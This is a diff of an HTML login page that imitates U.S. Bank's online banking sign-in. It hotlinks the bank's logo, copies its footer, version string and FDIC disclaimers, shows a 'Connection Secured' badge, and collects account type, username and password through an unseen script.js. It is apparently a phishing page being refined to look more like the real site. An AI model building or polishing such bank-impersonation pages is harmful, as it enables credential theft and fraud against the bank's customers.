@@ -2,64 +2,64 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Online Banking | U.S. Bank</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
+    <div id="loader"><div class="spinner"></div></div>
 
-<div id="loader">
-    <div class="spinner"></div>
-    <p style="margin-top:15px; color:#0c1c3e; font-weight:bold;">Verifying identity...</p>
-</div>
+    <header class="header">
+        <img src="https://www.usbank.com/etc.clientlibs/ecm-global/clientlibs/clientlib-resources/resources/images/svg/logo-personal.svg" alt="U.S. Bank">
+    </header>
 
-<div class="header">
-    <img src="https://www.usbank.com/content/dam/usbank/images/identity/usbank-logo-white.svg" alt="U.S. Bank">
-</div>
-
-<div class="container">
-    <h1>Account login</h1>
-    <form onsubmit="submitLogin(event)">
-        <div class="form-group">
-            <span class="label-text">Account type</span>
-            <select id="accType">
-                <option>Online banking</option>
-                <option>Online investing</option>
-                <option>Business banking</option>
-            </select>
-        </div>
-        <div class="form-group">
-            <input type="text" id="user" placeholder="Username" required>
-        </div>
-        <div class="form-group">
-            <input type="password" id="pass" placeholder="Password" required>
-        </div>
-        <button type="submit" class="action-btn">Log in</button>
-    </form>
-</div>
-
-<footer class="footer">
-    <div class="footer-container">
-        <div class="footer-top">
-            <div class="sec-side">
-                <img src="https://img.icons8.com/ios-filled/50/0c1c3e/lock.png" alt="lock"> Connection Secured
+    <div class="main-wrapper">
+        <div class="login-content">
+            <h1>Account login</h1>
+            <form id="loginForm">
+                <div class="form-group">
+                    <span class="label-text">Account type</span>
+                    <select id="accType">
+                        <option value="Online banking">Online banking</option>
+                        <option value="Online investing">Online investing</option>
+                        <option value="Business banking">Business banking</option>
+                        <option value="Corporate & commercial">Corporate & commercial</option>
+                        <option value="Institutional">Institutional</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <input type="text" id="user" placeholder="Username" required>
+                </div>
+                <div class="remember-me">
+                    <input type="checkbox"> Remember my username.
+                </div>
+                <div class="form-group">
+                    <input type="password" id="pass" placeholder="Password" required>
+                </div>
+                <button type="submit" class="submit-btn">Log in</button>
+            </form>
+            <div class="help-links">
+                <a href="#">Get login help ></a>
+                <a href="#">Create a username and password</a>
             </div>
-            <div class="links-side">
-                <a href="#">Security</a> | <a href="#">Privacy</a> | <a href="#">Your California privacy choices</a>
-            </div>
-        </div>
-        <div style="font-weight: 500;">
-            ©2024 U.S. Bank<br>
-            OLB Cloud : 2.35.0_BN_5980
-        </div>
-        <hr>
-        <div class="disclaimer">
-            Investment and Insurance products and services: Not a Deposit • Not FDIC Insured • May Lose Value • Not Bank Guaranteed • Not Insured by any Federal Government Agency. <br>
-            U.S. Bank is not responsible for and does not guarantee the products, services or performance of U.S. Bancorp Investments.
         </div>
     </div>
-</footer>
 
-<script src="script.js"></script>
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-top">
+                <div class="sec-side">
+                    <img src="https://img.icons8.com/ios-filled/50/0c1c3e/lock.png"> Connection Secured
+                </div>
+                <div class="links-side">
+                    <a href="#">Security</a> | <a href="#">Privacy</a> | <a href="#">Your California privacy choices</a>
+                </div>
+            </div>
+            <div>©2024 U.S. Bank<br>OLB Cloud : 2.35.0_BN_5980</div>
+            <hr>
+            <div class="disclaimer-bold">Investment and Insurance products and services including annuities are:</div>
+            <div>Not a Deposit • Not FDIC Insured • May Lose Value • Not Bank Guaranteed • Not Insured by any Federal Government Agency</div>
+        </div>
+    </footer>
+    <script src="script.js"></script>
 </body>
 </html>
